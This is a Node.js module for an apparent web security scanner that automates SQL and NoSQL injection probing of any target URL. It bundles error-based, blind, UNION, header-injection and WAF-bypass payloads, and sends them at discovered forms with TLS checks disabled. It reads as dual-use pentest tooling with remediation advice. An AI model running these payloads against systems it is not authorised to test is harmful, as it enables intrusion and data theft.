/**
 * VFN-CyberSite — Advanced SQL Injection Scanner
 * Comprehensive SQLi testing with 10+ attack techniques
 * Supports: MySQL, PostgreSQL, MSSQL, Oracle, SQLite
 */

const http = require('http');
const https = require('https');
const querystring = require('querystring');
const cheerio = require('cheerio');

// ============ DATABASE-SPECIFIC PAYLOADS ============

const SQLI_PAYLOADS = {
  // Error-Based
  errorBased: [
    { payload: "'", type: 'error', desc: 'Single quote error trigger', db: 'all' },
    { payload: "''", type: 'error', desc: 'Double quote comparison', db: 'all' },
    { payload: "'--", type: 'error', desc: 'Quote with comment', db: 'all' },
    { payload: "' OR '1'='1", type: 'error', desc: 'Classic OR bypass', db: 'all' },
    { payload: "' OR '1'='1'--", type: 'error', desc: 'OR bypass with comment', db: 'all' },
    { payload: "' OR '1'='1'/*", type: 'error', desc: 'OR bypass block comment', db: 'all' },
    { payload: "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--", type: 'error', desc: 'MySQL ExtractValue', db: 'mysql' },
    { payload: "1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--", type: 'error', desc: 'MySQL UpdateXML', db: 'mysql' },
    { payload: "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", type: 'error', desc: 'MySQL Double Query', db: 'mysql' },
    { payload: "1' AND 1=CONVERT(int,(SELECT @@version))--", type: 'error', desc: 'MSSQL CONVERT error', db: 'mssql' },
    { payload: "1' AND 1=CAST((SELECT @@version) AS int)--", type: 'error', desc: 'MSSQL CAST error', db: 'mssql' },
    { payload: "' HAVING 1=1--", type: 'error', desc: 'HAVING clause error', db: 'all' },
    { payload: "' GROUP BY columnnames HAVING 1=1--", type: 'error', desc: 'GROUP BY error', db: 'all' },
  ],

  // Boolean-Based Blind
  booleanBased: [
    { true: "1' AND 1=1--", false: "1' AND 1=2--", desc: 'Numeric boolean', db: 'all' },
    { true: "1' AND 'a'='a'--", false: "1' AND 'a'='b'--", desc: 'String boolean', db: 'all' },
    { true: "1' AND (SELECT 1)=1--", false: "1' AND (SELECT 1)=0--", desc: 'Subquery boolean', db: 'all' },
    { true: "1 AND 1=1", false: "1 AND 1=2", desc: 'Numeric no-quote boolean', db: 'all' },
    { true: "1') AND 1=1--", false: "1') AND 1=2--", desc: 'Parenthesis boolean', db: 'all' },
    { true: "1')) AND 1=1--", false: "1')) AND 1=2--", desc: 'Double-paren boolean', db: 'all' },
    { true: "1' AND SUBSTRING(@@version,1,1)>'0'--", false: "1' AND SUBSTRING(@@version,1,1)>'z'--", desc: 'Version substring', db: 'mysql' },
  ],

  // Time-Based Blind
  timeBased: [
    { payload: "1' AND SLEEP(5)--", desc: 'MySQL SLEEP', db: 'mysql', delay: 5 },
    { payload: "1' AND BENCHMARK(5000000,MD5('test'))--", desc: 'MySQL BENCHMARK', db: 'mysql', delay: 3 },
    { payload: "1'; WAITFOR DELAY '0:0:5'--", desc: 'MSSQL WAITFOR', db: 'mssql', delay: 5 },
    { payload: "1' AND pg_sleep(5)--", desc: 'PostgreSQL pg_sleep', db: 'postgres', delay: 5 },
    { payload: "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", desc: 'MySQL subquery SLEEP', db: 'mysql', delay: 5 },
    { payload: "1'||(SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END)--", desc: 'PostgreSQL conditional sleep', db: 'postgres', delay: 5 },
    { payload: "1' AND RANDOMBLOB(500000000/0)--", desc: 'SQLite heavy computation', db: 'sqlite', delay: 3 },
  ],

  // UNION-Based
  unionBased: [
    { payload: "' UNION SELECT NULL--", columns: 1, desc: 'UNION 1 column' },
    { payload: "' UNION SELECT NULL,NULL--", columns: 2, desc: 'UNION 2 columns' },
    { payload: "' UNION SELECT NULL,NULL,NULL--", columns: 3, desc: 'UNION 3 columns' },
    { payload: "' UNION SELECT NULL,NULL,NULL,NULL--", columns: 4, desc: 'UNION 4 columns' },
    { payload: "' UNION SELECT NULL,NULL,NULL,NULL,NULL--", columns: 5, desc: 'UNION 5 columns' },
    { payload: "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--", columns: 6, desc: 'UNION 6 columns' },
    { payload: "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--", columns: 7, desc: 'UNION 7 columns' },
    { payload: "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", columns: 8, desc: 'UNION 8 columns' },
    { payload: "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", columns: 9, desc: 'UNION 9 columns' },
    { payload: "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", columns: 10, desc: 'UNION 10 columns' },
  ],

  // ORDER BY (Column Count Discovery)
  orderBy: [
    { payload: "' ORDER BY 1--", desc: 'ORDER BY 1' },
    { payload: "' ORDER BY 2--", desc: 'ORDER BY 2' },
    { payload: "' ORDER BY 3--", desc: 'ORDER BY 3' },
    { payload: "' ORDER BY 5--", desc: 'ORDER BY 5' },
    { payload: "' ORDER BY 10--", desc: 'ORDER BY 10' },
    { payload: "' ORDER BY 15--", desc: 'ORDER BY 15' },
    { payload: "' ORDER BY 20--", desc: 'ORDER BY 20' },
    { payload: "' ORDER BY 50--", desc: 'ORDER BY 50' },
    { payload: "' ORDER BY 100--", desc: 'ORDER BY 100' },
  ],

  // Stacked Queries
  stacked: [
    { payload: "'; SELECT 1--", desc: 'Basic stacked query', db: 'all' },
    { payload: "'; SELECT pg_sleep(3)--", desc: 'PostgreSQL stacked sleep', db: 'postgres' },
    { payload: "'; WAITFOR DELAY '0:0:3'--", desc: 'MSSQL stacked delay', db: 'mssql' },
    { payload: "'; SELECT SLEEP(3)--", desc: 'MySQL stacked sleep', db: 'mysql' },
  ],

  // Header Injection SQLi
  headerInjection: [
    { header: 'User-Agent', payload: "' OR '1'='1'--", desc: 'User-Agent SQLi' },
    { header: 'Referer', payload: "' OR '1'='1'--", desc: 'Referer SQLi' },
    { header: 'X-Forwarded-For', payload: "' OR '1'='1'--", desc: 'X-Forwarded-For SQLi' },
    { header: 'Cookie', payload: "session=' OR '1'='1'--", desc: 'Cookie SQLi' },
    { header: 'X-Custom-IP-Authorization', payload: "' OR 1=1--", desc: 'Custom header SQLi' },
    { header: 'Accept-Language', payload: "' OR '1'='1'--", desc: 'Accept-Language SQLi' },
  ],

  // WAF Bypass Payloads
  wafBypass: [
    { payload: "' %4fR '1'='1'--", desc: 'URL-encoded OR', db: 'all' },
    { payload: "' /*!50000OR*/ '1'='1'--", desc: 'MySQL version comment', db: 'mysql' },
    { payload: "'/**/OR/**/1=1--", desc: 'Comment bypass', db: 'all' },
    { payload: "' oR '1'='1'--", desc: 'Mixed case bypass', db: 'all' },
    { payload: "'%0aOR%0a'1'='1'--", desc: 'Newline bypass', db: 'all' },
    { payload: "' || 1=1--", desc: 'Double pipe OR (Oracle/PG)', db: 'oracle' },
    { payload: "'-IF(1=1,SLEEP(3),0)--", desc: 'IF-based bypass', db: 'mysql' },
    { payload: "'%09OR%09'1'='1'--", desc: 'Tab character bypass', db: 'all' },
    { payload: "'+(SELECT+1+FROM+dual+WHERE+1=1)+'", desc: 'Oracle subquery', db: 'oracle' },
    { payload: "' UniOn SeLeCt NULL--", desc: 'Alternating case UNION', db: 'all' },
    { payload: "' UN/**/ION SEL/**/ECT NULL--", desc: 'Inline comment split', db: 'all' },
    { payload: "%27%20OR%20%271%27%3D%271", desc: 'Full URL encoding', db: 'all' },
    { payload: "' OR 1=1#", desc: 'Hash comment (MySQL)', db: 'mysql' },
    { payload: "') OR ('1'='1", desc: 'Parenthesis balance bypass', db: 'all' },
    { payload: "1;SELECT+IF(1=1,SLEEP(3),0)", desc: 'Semicolon bypass', db: 'mysql' },
  ],

  // JSON Body SQLi
  jsonPayloads: [
    { key: 'id', value: "1 OR 1=1", desc: 'JSON numeric injection' },
    { key: 'id', value: "1' OR '1'='1'--", desc: 'JSON string injection' },
    { key: 'username', value: "admin'--", desc: 'JSON login bypass' },
    { key: 'search', value: "' UNION SELECT NULL,NULL,NULL--", desc: 'JSON UNION' },
    { key: 'filter', value: {"$gt": ""}, desc: 'NoSQL $gt operator' },
    { key: 'query', value: {"$ne": null}, desc: 'NoSQL $ne operator' },
    { key: 'where', value: {"$where": "1==1"}, desc: 'NoSQL $where' },
  ],
};

// ============ SQL ERROR PATTERNS ============

const SQL_ERROR_PATTERNS = [
  // MySQL
  { pattern: /SQL syntax.*MySQL/i, db: 'MySQL' },
  { pattern: /Warning.*mysql_/i, db: 'MySQL' },
  { pattern: /MySql Error/i, db: 'MySQL' },
  { pattern: /valid MySQL result/i, db: 'MySQL' },
  { pattern: /You have an error in your SQL syntax/i, db: 'MySQL' },
  { pattern: /supplied argument is not a valid MySQL/i, db: 'MySQL' },
  { pattern: /Column count doesn't match/i, db: 'MySQL' },
  { pattern: /Unknown column/i, db: 'MySQL' },
  { pattern: /DBD::mysql/i, db: 'MySQL' },
  { pattern: /FUNCTION .+\.\w+ does not exist/i, db: 'MySQL' },

  // PostgreSQL
  { pattern: /PostgreSQL.*ERROR/i, db: 'PostgreSQL' },
  { pattern: /Warning.*pg_/i, db: 'PostgreSQL' },
  { pattern: /ERROR:\s+syntax error at or near/i, db: 'PostgreSQL' },
  { pattern: /unterminated quoted string/i, db: 'PostgreSQL' },
  { pattern: /PG::SyntaxError/i, db: 'PostgreSQL' },
  { pattern: /invalid input syntax for/i, db: 'PostgreSQL' },

  // MSSQL
  { pattern: /Microsoft.*ODBC.*SQL Server/i, db: 'MSSQL' },
  { pattern: /Unclosed quotation mark/i, db: 'MSSQL' },
  { pattern: /Microsoft OLE DB Provider for SQL Server/i, db: 'MSSQL' },
  { pattern: /mssql_query/i, db: 'MSSQL' },
  { pattern: /SQLServer JDBC Driver/i, db: 'MSSQL' },
  { pattern: /com\.microsoft\.sqlserver\.jdbc/i, db: 'MSSQL' },
  { pattern: /Incorrect syntax near/i, db: 'MSSQL' },
  { pattern: /Conversion failed when converting/i, db: 'MSSQL' },

  // Oracle
  { pattern: /ORA-\d{5}/i, db: 'Oracle' },
  { pattern: /Oracle.*Driver/i, db: 'Oracle' },
  { pattern: /quoted string not properly terminated/i, db: 'Oracle' },
  { pattern: /SQL command not properly ended/i, db: 'Oracle' },

  // SQLite
  { pattern: /SQLITE_ERROR/i, db: 'SQLite' },
  { pattern: /SQLite3::/i, db: 'SQLite' },
  { pattern: /near ".*": syntax error/i, db: 'SQLite' },
  { pattern: /unrecognized token/i, db: 'SQLite' },

  // Generic
  { pattern: /SQLSTATE\[/i, db: 'Generic' },
  { pattern: /PDOException/i, db: 'Generic' },
  { pattern: /Doctrine\\DBAL/i, db: 'Generic' },
  { pattern: /Hibernate/i, db: 'Generic' },
  { pattern: /org\.hibernate/i, db: 'Generic' },
  { pattern: /java\.sql\.SQLException/i, db: 'Generic' },
  { pattern: /JDBC Exception/i, db: 'Generic' },
];

// ============ HTTP HELPER ============

function makeRequest(targetUrl, options = {}) {
  return new Promise((resolve, reject) => {
    let parsed;
    try { parsed = new URL(targetUrl); } catch { return resolve({ statusCode: 0, body: '', headers: {}, responseTime: 0 }); }
    const client = parsed.protocol === 'https:' ? https : http;

    const reqOptions = {
      hostname: parsed.hostname,
      port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
      path: parsed.pathname + parsed.search,
      method: options.method || 'GET',
      timeout: options.timeout || 15000,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        ...options.headers
      },
      rejectUnauthorized: false,
    };

    if (options.body) {
      reqOptions.headers['Content-Type'] = options.contentType || 'application/x-www-form-urlencoded';
      reqOptions.headers['Content-Length'] = Buffer.byteLength(options.body);
    }

    const startTime = Date.now();
    let timer = null;
    let isDone = false;
    let activeReq = null;

    const cleanup = () => {
      if (timer) clearTimeout(timer);
    };

    const done = (result) => {
      if (isDone) return;
      isDone = true;
      cleanup();
      resolve(result);
    };

    timer = setTimeout(() => {
      if (activeReq) {
        try { activeReq.destroy(); } catch {}
      }
      done({ statusCode: 0, body: '', headers: {}, responseTime: Date.now() - startTime, timedOut: true });
    }, options.timeout || 10000);

    const req = client.request(reqOptions, (res) => {
      let body = '';
      const finish = () => {
        done({ statusCode: res.statusCode, headers: res.headers, body, responseTime: Date.now() - startTime, url: targetUrl });
      };

      res.on('data', chunk => {
        body += chunk;
        if (body.length > 200000) {
          try { res.destroy(); } catch {}
          finish();
        }
      });
      res.on('end', finish);
      res.on('close', finish);
      res.on('error', () => finish());
    });

    activeReq = req;
    req.on('error', () => done({ statusCode: 0, body: '', headers: {}, responseTime: Date.now() - startTime }));
    if (options.body) req.write(options.body);
    req.end();
  });
}

// ============ FORM DISCOVERY ============

async function discoverForms(targetUrl, html) {
  if (!html) {
    try { const r = await makeRequest(targetUrl); html = r.body; } catch { return []; }
  }
  const $ = cheerio.load(html);
  const forms = [];

  $('form').each((_, form) => {
    const $form = $(form);
    const action = $form.attr('action') || '';
    const method = ($form.attr('method') || 'GET').toUpperCase();
    const inputs = [];

    $form.find('input, textarea, select').each((_, input) => {
      const $input = $(input);
      inputs.push({ name: $input.attr('name') || '', type: $input.attr('type') || 'text', value: $input.attr('value') || '' });
    });

    let actionUrl = action;
    if (!action || action === '#') actionUrl = targetUrl;
    else if (action.startsWith('/')) { const p = new URL(targetUrl); actionUrl = `${p.protocol}//${p.host}${action}`; }
    else if (!action.startsWith('http')) actionUrl = new URL(action, targetUrl).href;

    forms.push({ action: actionUrl, method, inputs });
  });

  // URL parameters
  try {
    const parsed = new URL(targetUrl);
    if (parsed.search) {
      const params = new URLSearchParams(parsed.search);
      const paramInputs = [];
      for (const [key, value] of params) paramInputs.push({ name: key, type: 'url-param', value });
      if (paramInputs.length > 0) forms.push({ action: targetUrl, method: 'GET', inputs: paramInputs, isUrlParams: true });
    }
  } catch {}

  return forms;
}

// ============ INJECTION HELPER ============

async function injectPayload(form, inputName, payload, method) {
  const data = {};
  form.inputs.forEach(inp => { if (inp.name) data[inp.name] = inp.value || 'test'; });
  data[inputName] = payload;

  try {
    if (method === 'GET' || form.method === 'GET') {
      const testUrl = new URL(form.action);
      Object.entries(data).forEach(([k, v]) => testUrl.searchParams.set(k, v));
      return await makeRequest(testUrl.href);
    } else {
      return await makeRequest(form.action, {
        method: 'POST',
        body: querystring.stringify(data),
        contentType: 'application/x-www-form-urlencoded'
      });
    }
  } catch { return null; }
}

// ============ TEST FUNCTIONS ============

async function testErrorBased(form, input, findings) {
  if (!input.name || input.type === 'submit' || input.type === 'hidden' || input.type === 'button') return;

  for (const sqli of SQLI_PAYLOADS.errorBased) {
    const response = await injectPayload(form, input.name, sqli.payload, form.method);
    if (!response || !response.body) continue;

    const errorMatch = SQL_ERROR_PATTERNS.find(e => e.pattern.test(response.body));
    if (errorMatch) {
      findings.push({
        severity: 'critical',
        title: `SQL Injection — Error-Based [${errorMatch.db}] (${input.name})`,
        description: `Input "${input.name}" on ${form.action} is vulnerable to error-based SQL injection. Database: ${errorMatch.db}`,
        details: `Form: ${form.method} ${form.action}\nParameter: ${input.name}\nPayload: ${sqli.payload}\nType: ${sqli.desc}\nDatabase: ${errorMatch.db}\nError pattern: ${errorMatch.pattern}`,
        recommendation: 'Use parameterized queries (prepared statements). Never concatenate user input into SQL. Implement WAF and input validation.',
        evidence: `Payload: ${sqli.payload}\nDatabase: ${errorMatch.db}\nSQL error detected in response body`,
        cwe: 'CWE-89',
        owasp: 'A03:2021 - Injection',
      });
      return; // Found vulnerability, move on
    }
  }
}

async function testBooleanBased(form, input, findings) {
  if (!input.name || input.type === 'submit' || input.type === 'hidden' || input.type === 'button') return;

  // Get baseline
  const baseline = await injectPayload(form, input.name, input.value || 'test', form.method);
  if (!baseline) return;

  for (const sqli of SQLI_PAYLOADS.booleanBased) {
    const trueResp = await injectPayload(form, input.name, sqli.true, form.method);
    const falseResp = await injectPayload(form, input.name, sqli.false, form.method);
    if (!trueResp || !falseResp) continue;

    const trueDiff = Math.abs(trueResp.body.length - baseline.body.length);
    const falseDiff = Math.abs(falseResp.body.length - baseline.body.length);
    const boolDiff = Math.abs(trueResp.body.length - falseResp.body.length);

    // Significant difference between true and false responses
    if (boolDiff > 50 && (trueResp.statusCode === falseResp.statusCode || Math.abs(trueResp.body.length - falseResp.body.length) > 200)) {
      // Extra verification: check that true response is similar to baseline
      if (trueDiff < boolDiff * 0.5 || boolDiff > 200) {
        findings.push({
          severity: 'high',
          title: `SQL Injection — Boolean-Based Blind (${input.name})`,
          description: `Input "${input.name}" shows different responses for TRUE/FALSE SQL conditions, indicating boolean-based blind SQLi.`,
          details: `Form: ${form.method} ${form.action}\nParameter: ${input.name}\nTrue payload: ${sqli.true}\nFalse payload: ${sqli.false}\nTrue response: ${trueResp.body.length} bytes\nFalse response: ${falseResp.body.length} bytes\nDifference: ${boolDiff} bytes`,
          recommendation: 'Use parameterized queries. Implement input validation. Consider WAF deployment.',
          evidence: `TRUE: "${sqli.true}" → ${trueResp.body.length} bytes (HTTP ${trueResp.statusCode})\nFALSE: "${sqli.false}" → ${falseResp.body.length} bytes (HTTP ${falseResp.statusCode})\nBaseline: ${baseline.body.length} bytes`,
          cwe: 'CWE-89',
          owasp: 'A03:2021 - Injection',
        });
        return;
      }
    }
  }
}

async function testTimeBased(form, input, findings) {
  if (!input.name || input.type === 'submit' || input.type === 'hidden' || input.type === 'button') return;

  // Get baseline timing
  const baseline = await injectPayload(form, input.name, input.value || 'test', form.method);
  if (!baseline) return;
  const baselineTime = baseline.responseTime;

  for (const sqli of SQLI_PAYLOADS.timeBased) {
    const response = await injectPayload(form, input.name, sqli.payload, form.method);
    if (!response) continue;

    const expectedDelay = (sqli.delay || 5) * 1000;
    const actualDelay = response.responseTime - baselineTime;

    // Response took significantly longer (at least 70% of expected delay)
    if (response.responseTime > expectedDelay * 0.7 && actualDelay > 3000) {
      findings.push({
        severity: 'critical',
        title: `SQL Injection — Time-Based Blind [${sqli.db}] (${input.name})`,
        description: `Input "${input.name}" is vulnerable to time-based blind SQL injection. Response was delayed by ~${Math.round(actualDelay / 1000)}s.`,
        details: `Form: ${form.method} ${form.action}\nParameter: ${input.name}\nPayload: ${sqli.payload}\nExpected delay: ${sqli.delay}s\nActual response time: ${response.responseTime}ms\nBaseline: ${baselineTime}ms\nDatabase: ${sqli.db}`,
        recommendation: 'Use parameterized queries. This confirms the input is directly embedded in SQL queries.',
        evidence: `Payload: ${sqli.payload}\nResponse time: ${response.responseTime}ms (baseline: ${baselineTime}ms)\nDelay: ~${Math.round(actualDelay / 1000)}s`,
        cwe: 'CWE-89',
        owasp: 'A03:2021 - Injection',
      });
      return;
    }
  }
}

async function testUnionBased(form, input, findings) {
  if (!input.name || input.type === 'submit' || input.type === 'hidden' || input.type === 'button') return;

  // First discover column count using ORDER BY
  let maxColumns = 0;
  for (const orderBy of SQLI_PAYLOADS.orderBy) {
    const response = await injectPayload(form, input.name, orderBy.payload, form.method);
    if (!response) continue;

    const hasError = SQL_ERROR_PATTERNS.some(e => e.pattern.test(response.body));
    const colNum = parseInt(orderBy.desc.replace('ORDER BY ', ''));

    if (hasError && maxColumns === 0) maxColumns = colNum - 1;
    else if (!hasError) maxColumns = colNum;
  }

  if (maxColumns <= 0) return;

  // Try UNION SELECT with discovered column count
  for (const union of SQLI_PAYLOADS.unionBased) {
    if (union.columns > maxColumns + 2) break;

    const response = await injectPayload(form, input.name, union.payload, form.method);
    if (!response) continue;

    const hasError = SQL_ERROR_PATTERNS.some(e => e.pattern.test(response.body));
    if (!hasError && response.statusCode >= 200 && response.statusCode < 500) {
      // Check if UNION was successful (response differs from error)
      const baseline = await injectPayload(form, input.name, "' UNION SELECT 'cyberscan_test'" + ',NULL'.repeat(union.columns - 1) + '--', form.method);
      if (baseline && baseline.body.includes('cyberscan_test')) {
        findings.push({
          severity: 'critical',
          title: `SQL Injection — UNION-Based (${input.name})`,
          description: `Input "${input.name}" is vulnerable to UNION-based SQL injection. ${union.columns} columns detected.`,
          details: `Form: ${form.method} ${form.action}\nParameter: ${input.name}\nColumns: ${union.columns}\nPayload: ${union.payload}`,
          recommendation: 'Use parameterized queries. UNION-based SQLi allows full database extraction.',
          evidence: `Payload: ${union.payload}\nColumns detected: ${union.columns}\nUNION injection confirmed — data extractable`,
          cwe: 'CWE-89',
          owasp: 'A03:2021 - Injection',
        });
        return;
      }
    }
  }

  // Even if UNION data extraction wasn't confirmed, report column count discovery
  if (maxColumns > 0) {
    // Check if ORDER BY itself triggered SQL errors
    const testResp = await injectPayload(form, input.name, `' ORDER BY ${maxColumns + 5}--`, form.method);
    if (testResp && SQL_ERROR_PATTERNS.some(e => e.pattern.test(testResp.body))) {
      findings.push({
        severity: 'high',
        title: `SQL Injection — Column Count Discovered (${input.name})`,
        description: `ORDER BY probing reveals ${maxColumns} columns in the query behind "${input.name}". UNION injection may be possible.`,
        details: `Columns: ${maxColumns}\nORDER BY ${maxColumns} → OK\nORDER BY ${maxColumns + 1} → SQL Error`,
        recommendation: 'Use parameterized queries. Column count exposure confirms SQL injection vulnerability.',
        evidence: `ORDER BY ${maxColumns} → Success\nORDER BY ${maxColumns + 1} → SQL Error\nEstimated columns: ${maxColumns}`,
        cwe: 'CWE-89',
        owasp: 'A03:2021 - Injection',
      });
    }
  }
}

async function testHeaderInjection(targetUrl, findings) {
  // Get baseline
  const baseline = await makeRequest(targetUrl);
  if (!baseline) return;

  for (const test of SQLI_PAYLOADS.headerInjection) {
    const headers = {};
    headers[test.header] = test.payload;

    const response = await makeRequest(targetUrl, { headers });
    if (!response || !response.body) continue;

    const errorMatch = SQL_ERROR_PATTERNS.find(e => e.pattern.test(response.body));
    if (errorMatch) {
      findings.push({
        severity: 'critical',
        title: `SQL Injection — Header Injection [${test.header}]`,
        description: `The ${test.header} header is processed in SQL queries without sanitization. Database: ${errorMatch.db}`,
        details: `Header: ${test.header}\nPayload: ${test.payload}\nDatabase: ${errorMatch.db}\nError: ${errorMatch.pattern}`,
        recommendation: 'Never use HTTP headers directly in SQL queries. All input sources must be parameterized.',
        evidence: `Header "${test.header}: ${test.payload}" triggered SQL error\nDatabase: ${errorMatch.db}`,
        cwe: 'CWE-89',
        owasp: 'A03:2021 - Injection',
      });
    }
  }
}

async function testWAFBypass(form, input, findings, existingFindings) {
  // Only test WAF bypass if standard payloads were blocked
  if (existingFindings.length > 0) return; // Already found vulns, skip
  if (!input.name || input.type === 'submit' || input.type === 'hidden') return;

  let bypassed = false;
  for (const waf of SQLI_PAYLOADS.wafBypass) {
    const response = await injectPayload(form, input.name, waf.payload, form.method);
    if (!response || !response.body) continue;

    const errorMatch = SQL_ERROR_PATTERNS.find(e => e.pattern.test(response.body));
    if (errorMatch) {
      findings.push({
        severity: 'critical',
        title: `SQL Injection — WAF Bypass Successful (${input.name})`,
        description: `WAF/filter was bypassed using technique: "${waf.desc}". Input "${input.name}" is vulnerable.`,
        details: `Form: ${form.method} ${form.action}\nParameter: ${input.name}\nBypass technique: ${waf.desc}\nPayload: ${waf.payload}\nDatabase: ${errorMatch.db}`,
        recommendation: 'Fix the root cause (parameterized queries). WAF bypass demonstrates that WAF-only protection is insufficient.',
        evidence: `WAF Bypass: ${waf.desc}\nPayload: ${waf.payload}\nDatabase error triggered: ${errorMatch.db}`,
        cwe: 'CWE-89',
        owasp: 'A03:2021 - Injection',
      });
      bypassed = true;
      break;
    }
  }
}

async function testJSONInjection(targetUrl, findings) {
  // Test common API endpoints
  const apiEndpoints = [
    targetUrl,
    targetUrl.replace(/\/$/, '') + '/api/login',
    targetUrl.replace(/\/$/, '') + '/api/search',
    targetUrl.replace(/\/$/, '') + '/api/users',
    targetUrl.replace(/\/$/, '') + '/api/data',
  ];

  for (const endpoint of apiEndpoints) {
    for (const test of SQLI_PAYLOADS.jsonPayloads) {
      const body = JSON.stringify({ [test.key]: test.value });

      const response = await makeRequest(endpoint, {
        method: 'POST',
        body,
        contentType: 'application/json',
        timeout: 8000,
      });

      if (!response || !response.body) continue;

      const errorMatch = SQL_ERROR_PATTERNS.find(e => e.pattern.test(response.body));
      if (errorMatch) {
        findings.push({
          severity: 'critical',
          title: `SQL Injection — JSON API Body (${test.key})`,
          description: `API endpoint ${endpoint} is vulnerable to SQL injection via JSON parameter "${test.key}".`,
          details: `Endpoint: POST ${endpoint}\nJSON key: ${test.key}\nPayload: ${JSON.stringify(test.value)}\nDatabase: ${errorMatch.db}\nType: ${test.desc}`,
          recommendation: 'Use parameterized queries for all API endpoints. Validate and sanitize JSON input.',
          evidence: `POST ${endpoint}\nBody: ${body}\nSQL error detected: ${errorMatch.db}`,
          cwe: 'CWE-89',
          owasp: 'A03:2021 - Injection',
        });
        break;
      }

      // NoSQL injection check
      if (typeof test.value === 'object' && response.statusCode === 200 && response.body.length > 100) {
        const normalResp = await makeRequest(endpoint, {
          method: 'POST',
          body: JSON.stringify({ [test.key]: 'normal_value_12345' }),
          contentType: 'application/json',
          timeout: 8000,
        });
        if (normalResp && Math.abs(response.body.length - normalResp.body.length) > 200) {
          findings.push({
            severity: 'critical',
            title: `NoSQL Injection — ${test.desc} (${test.key})`,
            description: `API endpoint ${endpoint} may be vulnerable to NoSQL injection via operator "${test.desc}".`,
            details: `Endpoint: POST ${endpoint}\nOperator: ${JSON.stringify(test.value)}\nInjected response: ${response.body.length} bytes\nNormal response: ${normalResp.body.length} bytes`,
            recommendation: 'Validate MongoDB/NoSQL query parameters. Use mongoose schema validation. Never pass raw user input to NoSQL queries.',
            evidence: `Injected: ${body} → ${response.body.length} bytes\nNormal: ${normalResp.body.length} bytes\nDifference: ${Math.abs(response.body.length - normalResp.body.length)} bytes`,
            cwe: 'CWE-943',
            owasp: 'A03:2021 - Injection',
          });
        }
      }
    }
  }
}

// ============ MAIN SCANNER ============

async function runAdvancedSQLiScan(targetUrl, html = null, progressCallback = null) {
  const findings = [];

  if (progressCallback) progressCallback({ scanner: 'sqli-scanner', progress: 2, message: '[SQLi] Discovering forms and parameters...' });

  // Fetch page
  if (!html) {
    try { const r = await makeRequest(targetUrl); html = r.body; } catch { html = ''; }
  }

  const forms = await discoverForms(targetUrl, html);

  if (progressCallback) progressCallback({ scanner: 'sqli-scanner', progress: 8, message: `[SQLi] Found ${forms.length} forms/endpoints. Starting Error-Based testing...` });

  // Phase 1: Error-Based SQLi
  for (const form of forms) {
    for (const input of form.inputs) {
      await testErrorBased(form, input, findings);
    }
  }

  if (progressCallback) progressCallback({ scanner: 'sqli-scanner', progress: 25, message: `[SQLi] Error-Based done (${findings.length} found). Testing Boolean-Based...` });

  // Phase 2: Boolean-Based Blind
  for (const form of forms) {
    for (const input of form.inputs) {
      await testBooleanBased(form, input, findings);
    }
  }

  if (progressCallback) progressCallback({ scanner: 'sqli-scanner', progress: 40, message: `[SQLi] Boolean-Based done. Testing Time-Based Blind...` });

  // Phase 3: Time-Based Blind (selective — only test inputs not already found)
  const foundInputs = new Set(findings.map(f => f.title.match(/\(([^)]+)\)$/)?.[1]).filter(Boolean));
  for (const form of forms) {
    for (const input of form.inputs) {
      if (!foundInputs.has(input.name)) {
        await testTimeBased(form, input, findings);
      }
    }
  }

  if (progressCallback) progressCallback({ scanner: 'sqli-scanner', progress: 55, message: `[SQLi] Time-Based done. Testing UNION injection...` });

  // Phase 4: UNION-Based
  for (const form of forms) {
    for (const input of form.inputs) {
      if (!foundInputs.has(input.name)) {
        await testUnionBased(form, input, findings);
      }
    }
  }

  if (progressCallback) progressCallback({ scanner: 'sqli-scanner', progress: 70, message: `[SQLi] UNION done. Testing Header injection...` });

  // Phase 5: Header Injection
  await testHeaderInjection(targetUrl, findings);

  if (progressCallback) progressCallback({ scanner: 'sqli-scanner', progress: 80, message: `[SQLi] Headers done. Testing WAF bypass...` });

  // Phase 6: WAF Bypass (only if no findings yet for specific inputs)
  for (const form of forms) {
    for (const input of form.inputs) {
      const inputFindings = findings.filter(f => f.title.includes(input.name));
      await testWAFBypass(form, input, findings, inputFindings);
    }
  }

  if (progressCallback) progressCallback({ scanner: 'sqli-scanner', progress: 90, message: `[SQLi] WAF bypass done. Testing JSON/API injection...` });

  // Phase 7: JSON/API Body Injection
  await testJSONInjection(targetUrl, findings);

  if (progressCallback) progressCallback({ scanner: 'sqli-scanner', progress: 100, message: `[SQLi] Complete — ${findings.length} SQLi vulnerabilities found` });

  return {
    name: 'Advanced SQL Injection',
    category: 'Injection',
    icon: '💉',
    summary: `Tested ${forms.length} forms with 7 techniques — ${findings.length} SQLi vulnerabilities found`,
    formsScanned: forms.length,
    techniquesUsed: ['Error-Based', 'Boolean-Based', 'Time-Based', 'UNION-Based', 'Header Injection', 'WAF Bypass', 'JSON/API Injection'],
    findings,
  };
}

module.exports = { runAdvancedSQLiScan };
